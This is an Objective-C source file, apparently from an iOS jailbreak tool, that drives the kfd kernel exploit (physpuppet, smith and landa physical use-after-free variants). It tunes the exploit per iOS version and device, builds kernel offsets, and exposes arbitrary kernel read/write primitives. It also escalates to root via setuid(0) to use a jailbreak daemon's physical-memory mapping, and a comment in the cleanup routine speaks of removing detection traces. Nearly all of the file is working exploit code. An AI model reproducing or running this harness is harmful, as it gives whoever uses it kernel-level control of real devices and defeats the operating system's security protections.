#import "Exploit/libkfd.h"
#undef T1SZ_BOOT
#import <xpc/xpc.h>
#import <libjailbreak/info.h>
#import <libjailbreak/primitives_external.h>
#import <os/proc.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

uint64_t gKfd = 0;

// 🔥 简单的文件日志功能
static FILE *kfd_log_file = NULL;

// 🔥 获取真实的iOS版本（运行时检查）- 使用最安全的方法
bool is_ios_16_or_later(void) {
    // 使用sysctlbyname获取iOS版本字符串，避免Foundation调用
    char version_str[32];
    size_t size = sizeof(version_str);
    if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
        printf("🔍 iOS版本字符串: %s\n", version_str);
        
        // 解析版本号，比如"15.6.1"或"16.1.2"
        int major = 0;
        if (sscanf(version_str, "%d", &major) == 1) {
            bool result = (major >= 16);
            printf("🔍 主版本号: %d, is_ios_16_or_later() = %s\n", major, result ? "true" : "false");
            return result;
        }
    }
    // 如果获取失败，保守地假设是iOS 15
    printf("❌ 版本获取失败，假设为iOS 15\n");
    return false;
}

void kfd_log(const char *format, ...) {
    // 如果还没有打开日志文件，就打开它
    if (kfd_log_file == NULL) {
        // 使用简单的路径，避免Foundation框架调用
        const char *home = getenv("HOME");
        if (home) {
            char log_path[512];
            snprintf(log_path, sizeof(log_path), "%s/Documents/kfd_debug.log", home);
            kfd_log_file = fopen(log_path, "a");
            if (kfd_log_file) {
                // 添加iOS版本信息到日志 - 使用安全的系统调用
                char version_str[32];
                size_t size = sizeof(version_str);
                char ios_version[64] = "iOS 未知版本";
                if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
                    snprintf(ios_version, sizeof(ios_version), "iOS %s", version_str);
                }
                
                fprintf(kfd_log_file, "\n=== KFD Debug Log Started ===\n");
                fprintf(kfd_log_file, "📝 日志文件位置: %s\n", log_path);
                fprintf(kfd_log_file, "📱 检测到系统版本: %s\n", ios_version);
                fflush(kfd_log_file);
                printf("📝 KFD调试日志文件位置: %s\n", log_path);
                printf("📱 检测到系统版本: %s\n", ios_version);
            }
        }
        
        // 如果还是无法创建文件，尝试使用临时目录
        if (kfd_log_file == NULL) {
            kfd_log_file = fopen("/tmp/kfd_debug.log", "a");
            if (kfd_log_file) {
                // 使用安全的系统调用获取版本信息
                char version_str[32];
                size_t size = sizeof(version_str);
                char ios_version[64] = "iOS 未知版本";
                if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
                    snprintf(ios_version, sizeof(ios_version), "iOS %s", version_str);
                }
                
                fprintf(kfd_log_file, "\n=== KFD Debug Log Started (temp) ===\n");
                fprintf(kfd_log_file, "📱 检测到系统版本: %s\n", ios_version);
                fflush(kfd_log_file);
                printf("📝 KFD调试日志文件位置: /tmp/kfd_debug.log\n");
                printf("📱 检测到系统版本: %s\n", ios_version);
            }
        }
    }
    
    // 格式化并输出日志
    va_list args, args_copy;
    va_start(args, format);
    va_copy(args_copy, args);
    
    // 同时输出到控制台和文件
    vprintf(format, args);
    fflush(stdout);
    
    if (kfd_log_file) {
        vfprintf(kfd_log_file, format, args_copy);
        fflush(kfd_log_file);
    }
    
    va_end(args_copy);
    va_end(args);
}

// ==================== 越狱通道 ====================
// 已越狱（多巴胺/roothide 等）时不跑 KFD/PUAF，直接用越狱守护进程的内核读写。
// 原理：jbclient_initialize_primitives 走 jbserver root 域拿 physrw（守护进程把
// 物理地址空间映射进本进程 pmap），再挂 translation/IOSurface 层，全程零 bug 触发。
// 入口见 exploit_init_jailbreak()。
extern int jbclient_initialize_primitives(void);   // libjailbreak.dylib 导出（要求 getuid()==0）

static bool gUseJBChannel = false;     // 越狱通道已建立：读写走 gPrimitives.phys*
static uint64_t gJB_current_proc = 0;  // 越狱通道下的本进程 proc（exploit_init_jailbreak 沿 allproc 找出）

// 越狱通道读：va→pa（gPrimitives.vtophys）后走守护进程映射的 physrw 窗口。
// 按 0x1000 分块：4K/16K 内核页下都能保证块不跨翻译页。
static int jb_kreadbuf(uint64_t kaddr, void *output, size_t size)
{
    if (!gPrimitives.physreadbuf || !gPrimitives.vtophys) return -1;
    uint8_t *out = (uint8_t *)output;
    size_t done = 0;
    while (done < size) {
        uint64_t cur = kaddr + done;
        size_t chunk = 0x1000 - (size_t)(cur & 0xFFF);
        if (chunk > size - done) chunk = size - done;
        uint64_t pa = gPrimitives.vtophys(kconstant(cpuTTEP), cur);
        if (!pa) return -1;
        if (gPrimitives.physreadbuf(pa, out + done, chunk) != 0) return -1;
        done += chunk;
    }
    return 0;
}

static int jb_kwritebuf(uint64_t kaddr, const void *input, size_t size)
{
    if (!gPrimitives.physwritebuf || !gPrimitives.vtophys) return -1;
    const uint8_t *in = (const uint8_t *)input;
    size_t done = 0;
    while (done < size) {
        uint64_t cur = kaddr + done;
        size_t chunk = 0x1000 - (size_t)(cur & 0xFFF);
        if (chunk > size - done) chunk = size - done;
        uint64_t pa = gPrimitives.vtophys(kconstant(cpuTTEP), cur);
        if (!pa) return -1;
        if (gPrimitives.physwritebuf(pa, (void *)(in + done), chunk) != 0) return -1;
        done += chunk;
    }
    return 0;
}

// 统一读写入口：越狱通道走 physrw 窗口，否则走 KFD 原语
static int kread_ex(uint64_t where, void *buf, size_t size)
{
    if (gUseJBChannel) return jb_kreadbuf(where, buf, size);
    if (!gKfd) { memset(buf, 0, size); return -1; }   // 无内核通路（降级/未初始化）：安全失败
    kread(gKfd, where, buf, size);
    return 0;
}

static int kwrite_ex(uint64_t where, const void *buf, size_t size)
{
    if (gUseJBChannel) return jb_kwritebuf(where, buf, size);
    if (!gKfd) return -1;   // 无内核通路：安全失败
    kwrite(gKfd, (void *)buf, where, size);
    return 0;
}

uint8_t kread8(uint64_t where)
{
  uint64_t out;
  kread_ex(where, &out, sizeof(uint64_t));
  return (uint8_t)out;
}
uint16_t kread16(uint64_t where)
{
  uint64_t out;
  kread_ex(where, &out, sizeof(uint64_t));
  return (uint16_t)out;
}
uint32_t kread32(uint64_t where)
{
  uint64_t out;
  kread_ex(where, &out, sizeof(uint64_t));
  return (uint32_t)out;
}
uint64_t kread64(uint64_t where)
{
  uint64_t out;
  kread_ex(where, &out, sizeof(uint64_t));
  return out;
}

void kwrite8(uint64_t where, uint8_t what)
{
  uint8_t _buf[8] = {};
  _buf[0] = what;
  _buf[1] = kread8(where+1);
  _buf[2] = kread8(where+2);
  _buf[3] = kread8(where+3);
  _buf[4] = kread8(where+4);
  _buf[5] = kread8(where+5);
  _buf[6] = kread8(where+6);
  _buf[7] = kread8(where+7);
  kwrite_ex(where, &_buf, sizeof(u64));
}
void kwrite16(uint64_t where, uint16_t what)
{
  u16 _buf[4] = {};
  _buf[0] = what;
  _buf[1] = kread16(where+2);
  _buf[2] = kread16(where+4);
  _buf[3] = kread16(where+6);
  kwrite_ex(where, &_buf, sizeof(u64));
}
void kwrite32(uint64_t where, uint32_t what)
{
  u32 _buf[2] = {};
  _buf[0] = what;
  _buf[1] = kread32(where+4);
  kwrite_ex(where, &_buf, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what)
{
  u64 _buf[1] = {};
  _buf[0] = what;
  kwrite_ex(where, &_buf, sizeof(u64));
}

int kreadbuf(uint64_t where, void *buf, size_t size)
{
  if (size == 1) {
    *(uint8_t*)buf = kread8(where);
  }
  else if (size == 2) {
    *(uint16_t*)buf = kread16(where);
  }
  else if (size == 4) {
    *(uint32_t*)buf = kread32(where);
  }
  else {
    if (size >= UINT16_MAX) {
      for (uint64_t start = 0; start < size; start += UINT16_MAX) {
        uint64_t sizeToUse = UINT16_MAX;
        if (start + sizeToUse > size) {
          sizeToUse = (size - start);
        }
        kread_ex(where+start, ((uint8_t *)buf)+start, sizeToUse);
      }
    } else {
      kread_ex(where, buf, size);
    }
  }
  return 0;
}

int kwritebuf(uint64_t where, const void *buf, size_t size)
{
  if (size == 1) {
    kwrite8(where, *(uint8_t*)buf);
  }
  else if (size == 2) {
    kwrite16(where, *(uint16_t*)buf);
  }
  else if (size == 4) {
    kwrite32(where, *(uint32_t*)buf);
  }
  else {
    if (size >= UINT16_MAX) {
      for (uint64_t start = 0; start < size; start += UINT16_MAX) {
        uint64_t sizeToUse = UINT16_MAX;
        if (start + sizeToUse > size) {
          sizeToUse = (size - start);
        }
        kwrite_ex(where+start, (void*)((uint8_t *)buf)+start, sizeToUse);
      }
    } else {
      kwrite_ex(where, (void*)buf, size);
    }
  }
  return 0;
}

int exploit_init(const char *flavor)
{
    kfd_log("🚀 开始KFD初始化，exploit: %s\n", flavor);
    
    u64 method = 0;
    if (!strcmp(flavor, "physpuppet")) {
        method = puaf_physpuppet;
        kfd_log("✅ 选择exploit: physpuppet\n");
    }
    else if(!strcmp(flavor, "smith")) {
        method = puaf_smith;
        kfd_log("✅ 选择exploit: smith\n");
    }
    else if (!strcmp(flavor, "landa")) {
        method = puaf_landa;
        kfd_log("✅ 选择exploit: landa\n");
    }
    else {
        kfd_log("❌ 未知的exploit: %s\n", flavor);
        return -1;
    }

    bool isiOS15 = false;

    u64 kread_method = 0, kwrite_method = 0;
    if (is_ios_16_or_later()) {
        kread_method = kread_sem_open;
        kwrite_method = kwrite_sem_open;
        kfd_log("📱 iOS 16+: 使用sem_open读写方法\n");
    }
    else {
        kread_method = kread_IOSurface;
        kwrite_method = kwrite_IOSurface;
        isiOS15 = true;
        kfd_log("📱 iOS 15: 使用IOSurface读写方法\n");
    }

    uint64_t vm_map__pmap = koffsetof(vm_map, pmap);

    uint64_t pmap_to_hint = 0; // offset between vm_map->pmap and vm_map->hint
    // 使用安全的系统调用获取版本信息
    char version_str[32];
    size_t size = sizeof(version_str);
    if (sysctlbyname("kern.osproductversion", version_str, &size, NULL, 0) == 0) {
        int major = 0, minor = 0;
        if (sscanf(version_str, "%d.%d", &major, &minor) >= 1) {
            if (major >= 16) {
                pmap_to_hint = 0x58;
                kfd_log("🔧 iOS 16+: pmap_to_hint = 0x58\n");
            }
            else if (major == 15 && minor >= 4) {
                pmap_to_hint = 0x38;
                kfd_log("🔧 iOS 15.4+: pmap_to_hint = 0x38\n");
            }
            else {
                pmap_to_hint = 0xB8;
                kfd_log("🔧 iOS 15.0-15.3/iOS 14: pmap_to_hint = 0xB8\n");
            }
        } else {
            // 解析失败，使用保守值
            pmap_to_hint = 0x38;
            kfd_log("🔧 版本解析失败，使用默认: pmap_to_hint = 0x38\n");
        }
    } else {
        // 获取失败，使用保守值
        pmap_to_hint = 0x38;
        kfd_log("🔧 版本获取失败，使用默认: pmap_to_hint = 0x38\n");
    }

    // 检查patchfinding是否成功
    uint64_t static_base = kconstant(staticBase);
    kfd_log("🔍 Patchfinding检查: staticBase = 0x%llx\n", static_base);
    
    if (static_base != 0) {
        kfd_log("✅ Patchfinding成功，使用动态偏移\n");
    } else {
        kfd_log("⚠️  Patchfinding失败，可能导致exploit失败\n");
    }
    
    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = (kread_method == kread_IOSurface),
        .perf_supported = (kread_method != kread_IOSurface || kwrite_method != kwrite_IOSurface),
        
        .kernelcache__static_base = static_base,

        .proc__p_list__le_next = koffsetof(proc, list_next),
        .proc__p_list__le_prev = koffsetof(proc, list_prev),
        .proc__p_pid           = koffsetof(proc, pid),
        .proc__p_fd__fd_ofiles = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start),
        .proc__object_size     = ksizeof(proc),
    
        .task__map = koffsetof(task, map),
    
        .vm_map__hdr_links_prev             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, prev),
        .vm_map__hdr_links_next             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, next),
        .vm_map__min_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, min),
        .vm_map__max_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max),
        .vm_map__hdr_nentries               = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_nentries_u64           = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_rb_head_store_rbh_root = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x18,
    
        .vm_map__pmap        = vm_map__pmap,
        .vm_map__hint        = vm_map__pmap + pmap_to_hint,
        .vm_map__hole_hint   = vm_map__pmap + pmap_to_hint + 0x8,
        .vm_map__holes_list  = vm_map__pmap + pmap_to_hint + 0x10,
        .vm_map__object_size = vm_map__pmap + pmap_to_hint + 0x28,
        
        .IOSurface__isa                 =   0x0,
        .IOSurface__pixelFormat         =  0xa4,
        .IOSurface__allocSize           =  0xac,
        .IOSurface__useCountPtr         =  0xc0,
        .IOSurface__indexedTimestampPtr = 0x360,
        .IOSurface__readDisplacement    =  0x14,

        .thread__thread_id = 0x400, // TODO: Universalize (Only relevant for kread_kqueue_workloop_ctl)

        .kernelcache__allproc          = ksymbol(allproc),
        
        .kernelcache__cdevsw           = ksymbol(cdevsw),
        .kernelcache__gPhysBase        = ksymbol(gPhysBase),
        .kernelcache__gPhysSize        = ksymbol(gPhysSize),
        .kernelcache__gVirtBase        = ksymbol(gVirtBase),
        .kernelcache__perfmon_dev_open = ksymbol(perfmon_dev_open),
        .kernelcache__perfmon_devices  = ksymbol(perfmon_devices),
        .kernelcache__ptov_table       = ksymbol(ptov_table),
        .kernelcache__vn_kqfilter      = ksymbol(vn_kqfilter),
        
        .device__T1SZ_BOOT            = kconstant(T1SZ_BOOT),
        .device__ARM_TT_L1_INDEX_MASK = kconstant(ARM_TT_L1_INDEX_MASK),
    };

    if (isiOS15) {
        dynamic_system_info.proc__task = 0x10;
    }
    if (@available(iOS 15.4, *)) {
        dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root -= 0x8;
    }

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    // hw.memsize reports the amount of RAM after carveouts, so we pick a value lower than the
    // actual amount of RAM to compare against.
    uint64_t device_memory = 0;
    size_t device_memory_size = sizeof(device_memory);
    int res = sysctlbyname("hw.memsize", &device_memory, &device_memory_size, NULL, 0);

    size_t available_memory = os_proc_available_memory();

    int puaf_pages = 512;
    if (device_memory >= 1024 * 1024 * 1024 * 5ULL) { // 6GB devices
        // These devices are remarkably more reliable with 3072
        puaf_pages = 3072;
    } else if (cpuFamily == CPUFAMILY_ARM_TWISTER) { // A9
        puaf_pages = 128;
        if (is_ios_16_or_later()) {
            // sem_open does not like 128
            puaf_pages = 160;
        }
    } else if (cpuFamily == CPUFAMILY_ARM_TYPHOON) { // A8
        puaf_pages = 256;
    }

    kfd_log("🔧 设备信息: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);
    kfd_log("🎯 PUAF pages: %d\n", puaf_pages);

    size_t hogger_memory = 0;
    if (device_memory > 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
        // We want to hog 4GB at max, but we want to leave some memory for the exploit as well
        // Reserve 512MB + (puaf_pages * page size)
        size_t minimum_memory_remaining = 1024 * 1024 * 512ULL;
        // Don't hog if the available memory is less than 1.5 times the minimum memory remaining
        if (available_memory <= (size_t)(minimum_memory_remaining * 1.5)) {
            hogger_memory = 0;
        } else {
            hogger_memory = available_memory - min(minimum_memory_remaining, 1024 * 1024 * 1024 * 4ULL);
        }
    }

//    printf("PUAF pages: %d, hogger memory: 0x%010zx\n", puaf_pages, hogger_memory);

    void* hogged = NULL;
    if (hogger_memory > 0) {
        hogged = malloc(hogger_memory);
        if (hogged != NULL) {
            memset(hogged, 0x41, hogger_memory);
        } else {
//            printf("Failed to hog memory\n");
        }
    }

    size_t available_memory_after_hogging = os_proc_available_memory();
    kfd_log("💾 Hogging后可用内存: 0x%010zx\n", available_memory_after_hogging);
    
    // 记录即将启动的exploit参数
    const char* exploit_name = "unknown";
    if (method == puaf_physpuppet) exploit_name = "physpuppet";
    else if (method == puaf_landa) exploit_name = "landa";
    else if (method == puaf_smith) exploit_name = "smith";
    
    kfd_log("🚀 即将启动KFD: %s, kread=%llu, kwrite=%llu\n", exploit_name, kread_method, kwrite_method);
    
    gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
    
    // 检查KFD是否成功初始化
    if (gKfd == 0) {
        kfd_log("❌ KFD初始化失败: kopen返回0\n");
        kfd_log("   参数: puaf_pages=%d, method=%llu, kread=%llu, kwrite=%llu\n",
               puaf_pages, method, kread_method, kwrite_method);
        if (hogged != NULL) {
            free(hogged);
        }
        return -1;
    }
    
    kfd_log("✅ KFD初始化成功: 0x%llx\n", gKfd);
    
    gPrimitives.kreadbuf = kreadbuf;
    gPrimitives.kwritebuf = kwritebuf;
    
    if (hogged != NULL) {
        free(hogged);
    }
    
    // 获取kernel slide
    gSystemInfo.kernelConstant.slide = ((struct kfd *)gKfd)->info.kaddr.kernel_slide;
    uint64_t current_proc = ((struct kfd *)gKfd)->info.kaddr.current_proc;
    
    kfd_log("✅ Kernel slide: 0x%llx, current_proc: 0x%llx\n",
           gSystemInfo.kernelConstant.slide, current_proc);

    return 0;
}


uint64_t kfd_get_current_proc(void)
{
    if (!gKfd) return gJB_current_proc;   // 越狱通道：exploit_init_jailbreak 已沿 allproc 找好
    return ((struct kfd *)gKfd)->info.kaddr.current_proc;
}


// 越狱通道初始化：已越狱时用越狱守护进程的内核读写替代 KFD/PUAF。
// - 完整通道（需 getuid()==0）：jbclient_initialize_primitives 建 physrw + 取符号表，
//   全程零内核 bug 触发，不会产生脏页表/内核 panic。
// - 失败返回 -1，由调用方降级（只做符号解析），绝不回退跑内核利用。
int exploit_init_jailbreak(void)
{
    if (gUseJBChannel && gPrimitives.physreadbuf) {
        kfd_log("ℹ️ 越狱通道: 已初始化，跳过重复初始化\n");
        return 0;
    }

    // jbclient_initialize_primitives 要求 getuid()==0：
    // -hud 进程本就是 root（persona 拉起）；UI 进程尝试 setuid 提权。
    uid_t 原uid = getuid();
    gid_t 原gid = getgid();
    if (原uid != 0) {
        if (setgid(0) != 0 || setuid(0) != 0) {
            kfd_log("⚠️ 越狱通道: 提权失败 uid=%d euid=%d，走降级模式\n", getuid(), geteuid());
            return -1;
        }
    }

    int r = jbclient_initialize_primitives();

    // 权限用完即降：physrw 窗口已映射进本进程，读写不再需要 root；
    // 降回去避免 UI 进程以 root 身份写文件改变属主。
    if (原uid != 0) {
        setuid(原uid);
        setgid(原gid);
    }

    if (r != 0) {
        kfd_log("❌ 越狱通道: jbclient_initialize_primitives 失败 r=%d\n", r);
        return -1;
    }

    gUseJBChannel = true;

    // 内核自检：kernel base 头必须是 Mach-O magic，确认通路真的通了
    uint64_t 基 = kconstant(base);
    if (!基) 基 = kconstant(staticBase) + kconstant(slide);
    uint32_t magic = kread32(基);
    if (magic != 0xFEEDFACF) {
        kfd_log("❌ 越狱通道: 内核自检失败 base=0x%llx magic=0x%08x\n", 基, magic);
        gUseJBChannel = false;
        return -1;
    }

    // current_proc：沿 allproc 链表找本进程 proc（KFD 路径由 info_run 提供，这里自己走）
    gJB_current_proc = 0;
    uint64_t allproc = ksymbol(allproc);
    if (allproc) {
        int 我的pid = getpid();
        uint64_t p = kread64(allproc);
        for (int i = 0; i < 8192 && (p >> 48) == 0xFFFF; i++) {
            if ((int)kread32(p + koffsetof(proc, pid)) == 我的pid) {
                gJB_current_proc = p;
                break;
            }
            p = kread64(p + koffsetof(proc, list_next));
        }
    }

    kfd_log("✅ 越狱通道: physrw 就绪 base=0x%llx current_proc=0x%llx allproc=0x%llx\n",
            基, gJB_current_proc, ksymbol(allproc));
    return 0;
}


int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    if (!gKfd) return -1;
    kclose(gKfd);
    
    // 清理全局变量，移除检测特征
    gKfd = 0;

    return 0;
}
